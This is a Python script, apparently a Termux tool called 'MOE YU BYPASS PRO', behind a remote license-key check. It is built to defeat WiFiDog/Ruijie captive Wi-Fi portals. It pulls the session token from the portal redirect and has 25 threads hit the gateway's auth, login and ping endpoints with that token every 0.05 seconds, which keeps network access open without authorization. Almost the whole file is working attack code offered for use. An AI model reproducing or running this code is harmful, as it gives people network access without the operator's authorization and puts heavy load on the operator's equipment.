import requests
import re
import urllib3
import time
import threading
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 25  # ပိုမိုမြန်ဆန်စေရန် Thread တိုးမြှင့်ထားသည်

# ANSI COLORS FOR TERMUX (Formatting Fix)
G = "\033[1;92m" 
C = "\033[1;96m" 
R = "\033[1;91m" 
Y = "\033[1;93m" 
W = "\033[0m"

BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

# ===============================
# SECURITY SYSTEM
# ===============================

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", border_style="cyan", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> AUTHENTICATING... ACCESS GRANTED!{W}")
            return True
        else:
            console.print(f"{R}❌ INVALID KEY!{W}")
            sys.exit()
    except:
        console.print(f"{R}📡 CONNECTION ERROR!{W}")
        sys.exit()

# ===============================
# CORE ENGINE: PERSISTENCE BYPASS
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO ENGINE v15.0 🔥[/bold white]"), border_style="red", expand=False))
    
    # Persistent Session Setup
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=3)
    session.mount('http://', adapter)
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })

    while True:
        try:
            # Step 1: Connectivity Check
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204 and "ruijie" not in check.url:
                sys.stdout.write(f"\r{G}[✓] STATUS: ONLINE | BYPASS STABLE ✅ {W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Step 2: Token & Gateway Extraction
            portal_url = check.url
            parsed_url = urlparse(portal_url)
            query = parse_qs(parsed_url.query)
            
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('sessionId', [None])[0] or 
                   query.get('token', [None])[0])
            
            gw_ip = query.get('gw_address', [None])[0] or parsed_url.netloc.split(':')[0]
            gw_port = query.get('gw_port', ['2060'])[0]

            if sid and gw_ip:
                # Bypass URLs Construction
                auth_links = [
                    f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}",
                    f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}",
                    f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}"
                ]

                def pulse_injection():
                    while True:
                        try:
                            # VPN ပိတ်လိုက်ချိန်တွင် Session မပြုတ်စေရန် အတင်းအကြပ် Packet များထိုးသွင်းခြင်း
                            for link in auth_links:
                                session.get(link, timeout=3)
                            sys.stdout.write(f"\r{C}[!] Injecting: {gw_ip} | Token Active | Pulse Running... {W}")
                            sys.stdout.flush()
                        except:
                            pass
                        time.sleep(0.05) # Turbo mode

                # Start Multi-threaded Injection
                for _ in range(PING_THREADS):
                    t = threading.Thread(target=pulse_injection, daemon=True)
                    t.start()

                console.print(f"\n{Y}[!] Token Captured & Injected. You can try closing VPN now.{W}")
                
                # Check for stability
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(15)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"\r{R}[×] No Token Captured. Please refresh Login Page!{W}")
                sys.stdout.flush()
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        console.print(f"\n{R}[!] Stopped by User.{W}")
        sys.exit()
